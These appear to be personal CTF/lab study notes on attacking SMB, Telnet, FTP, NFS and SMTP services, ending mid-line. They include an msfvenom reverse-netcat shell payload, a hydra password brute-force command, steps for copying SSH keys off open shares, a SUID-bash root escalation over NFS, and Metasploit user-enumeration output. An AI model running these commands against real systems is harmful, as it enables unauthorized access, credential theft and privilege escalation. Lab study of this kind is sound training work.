## SMB Server Message Block

protocol response-request

TCP/IP

Samba (unix)

Enumeration

nmap -A -p-

enum4linux -A <ip>


CVE-2017-7494	remote code execution

smbclient //<ip>/<share> -U anonymous -p 445 		(-L flag = list host)

if you can find id_rsa key , download , change permissions

chmod 600 <filename>

then ssh with key,


https://pentestlab.blog/2017/09/25/suid-executables/


## Telnet aplication protocol (old SSH) 

plaintext

Enumeration

nmap -A -p-

try ping to confirm 

tcpdump ip proto \\icmp -i tun0     open listener

send ping

ping <lhost> -c 1


create nc shell with msvenom
msfvenom -p cmd/unix/reverse_netcat lhost=<ip> lport=4444 R

nc -lvnp 4444

we get root

## FTP  client-server   

standard port 21

enumarate nmap 

hydra
hydra -t 4 -l dale -P /usr/share/wordlists/rockyou.txt -vV 10.10.10.6 ftp

took out -vV  -t 4 = parallel connections per target
hydra -t 4 -l <user> -P /usr/share/wordlists/rockyou.txt 10.10.10.6 ftp


further reading:

https://medium.com/@gregIT/exploiting-simple-network-services-in-ctfs-ec8735be5eef

https://attack.mitre.org/techniques/T1210/

https://www.nextgov.com/cybersecurity/2019/10/nsa-warns-vulnerabilities-multiple-vpn-services/160456/

## NFS (network file system) for cross OS (Windows,Linux,MacOS)

protocol RPC  uses user id / group id


Enumeration

nmap -A -p-


NFS-Common -- software -- lockd, statd, showmount, nfsstat, gssd, idmapd and mount.nfs.

/usr/sbin/showmount -e [IP] 
/usr/sbin/showmount -e 10.10.238.222

mkdir /tmp/mount  (on your system)  // preferably temp,, having a hell of a time umount this shit, 

mount -t nfs IP:share /tmp/mount/ -nolock

mount -t nfs 10.10.238.222:home /tmp/mount/ -nolock

after we mount , we navigate to our /tmp/mount and look for id_rsa

cp to other directory, then chmod 600 id_rsa

and ssh into server 



Escalating

change directory to the mount point on your machine, where the NFS share should still be mounted, and then into the user's home directory.


Download bash
https://github.com/polo-sec/writing/blob/master/Security%20Challenge%20Walkthroughs/Networks%202/bash

cp file to share, and modify file

sudo chown root bash

chmod +rwxs <file>

then, in ssh, execute bash, bash prompt should appear, and you are root, 

## SMTP  Simple Mail Transfer Protocol  handshake port 25
POP Post Office Protocol (more simplistic)  //  IMAP  Internet Message Access Protocol  (synchronize)

user =>  SMTP =>  Internet   =>  TOP/IMAP  => recipient


Enumerating

msf6 > nmap 10.10.162.40
[*] exec: nmap 10.10.162.40

Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-11 10:43 EST
Nmap scan report for 10.10.162.40
Host is up (0.16s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
25/tcp open  smtp

Nmap done: 1 IP address (1 host up) scanned in 3.08 seconds




msf6 auxiliary(scanner/smtp/smtp_version) > run

[+] 10.10.162.40:25       - 10.10.162.40:25 SMTP 220 polosmtp.home ESMTP Postfix (Ubuntu)\x0d\x0a
[*] 10.10.162.40:25       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed





msf6 auxiliary(scanner/smtp/smtp_enum) > set USER_FILE /usr/share/seclists/Usernames/top-usernames-shortlist.txt
USER_FILE => /usr/share/seclists/Usernames/top-usernames-shortlist.txt
msf6 auxiliary(scanner/smtp/smtp_enum) > run

[*] 10.10.162.40:25       - 10.10.162.40:25 Banner: 220 polosmtp.home ESMTP Postfix (Ubuntu)
[*] 10.10.162.40:25       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/smtp/smtp_enum) > check
[-] Check failed: NoMethodError This module does not support check.
msf6 auxiliary(scanner/smtp/smtp_enum) > set RHOSTS 10.10.33.66
RHOSTS => 10.10.33.66
msf6 auxiliary(scanner/smtp/smtp_enum) > run

[*] 10.10.33.66:25        - 10.10.33.66:25 Banner: 220 polosmtp.home ESMTP Postfix (Ubuntu)
[+] 10.10.33.66:25        - 10.10.33.66:25 Users found: administrator
[*] 10.10.33.66:25        - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed


2 ports 22 and 25

220 polosmtp.home ESMTP Postfix (Ubuntu)

user admi